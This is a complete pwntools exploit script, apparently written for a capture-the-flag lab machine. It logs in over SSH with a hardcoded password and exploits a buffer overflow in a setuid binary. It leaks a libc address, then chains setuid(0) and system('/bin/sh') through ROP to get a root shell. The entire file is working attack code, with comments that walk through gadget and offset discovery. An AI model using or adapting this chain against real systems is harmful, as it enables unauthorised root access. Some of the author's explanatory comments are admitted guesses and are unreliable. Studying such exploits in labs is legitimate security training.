from pwn import *
from time import sleep

session = ssh('margo', '10.10.10.139', password='iamgod$08')

###### CONFIG - What to run and how
context(terminal=['gnome-terminal','-e'])
# p = gdb.debug('./garbage', 'b main')
# p = process('./garbage')
p = session.process('/usr/bin/garbage')
context(os='linux', arch='amd64')

context.log_level = 'DEBUG'

###### VARS
### Searching for puts which will allow me to print itself and its offset compared to the plt - process local table - and got - global object table from the executable (garbage)
### objdump -D garbage | grep puts
# 401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
puts_plt = p64(0x401050)
puts_got = p64(0x404028)
main_plt = p64(0x401619)

### I need to find a pop rdi, so with peda: ropsearch "pop rdi". 
### This is magic, I don't know why. I'm quite sure it is needed just because I have to remove an element from the stack.
# 0x0040179b ; pop rdi; ret
pop_rdi = p64(0x0040179b)


### This has been generated with;
### pattern create 500
### given as input and copied a snippet from the overflown register
### pattern offset 'pastehere'
### 135, so +1 vvv
junk = 'A'*136

###### EXPLOIT STAGE 1 - LEAK

### Lets put all together and main_plt to the end is needed to not make it crash after calculating the leaked address.
### We have to restart the program after calculating the leaked address.
payload = junk + pop_rdi + puts_got + puts_plt + main_plt

log.info("Stage 1: Leak address. Payload:\n" + payload)

# Enter access password: 
p.recvuntil('password: ')
p.sendline(payload)
# Access denied.
p.recvuntil('denied.\n')

# Here is leaked the address.
line = p.recvline()
print str(line)
# Let's round it up to be 8 bytes.
leaked_puts = line[:8].strip().ljust(8, "\x00")

log.info("Leaked address: " + leaked_puts)

leaked_puts = u64(leaked_puts)
log.success("Leaked puts@GLIBC: " + str(leaked_puts))
# raw_input()




###### EXPLOIT STAGE 2 - SHELL
### Get the functions that I need with
### readelf -s libc.so.6 | grep 'funcname'
### strings -a -t x libc.so.6 | grep 'string'

### Please note that I've taken the WEAK ones always.
#   422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
libc_puts = 0x809c0
#   1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
libc_sys = 0x4f440
#   23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5
libc_setuid = 0xe5970
# 1b3e9a /bin/sh
libc_sh = 0x1b3e9a

### Need to calculate the offset as the difference between the leaked address and the location of the fucntion in the library:
offset = leaked_puts - libc_puts
### Now I can calculate where the functions are at runtime
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)
setuid = p64(offset + libc_setuid)
null = p64(0x0)

log.info('/bin/sh address : {}'.format(str(sh)))
log.info('system address : {}'.format(str(sys)))

payload = junk + pop_rdi + null + setuid + pop_rdi + sh + sys

log.info('Stage 2 : Payload : '+ payload)
log.info(p.recvuntil('password: '))

p.sendline(payload)

p.interactive()
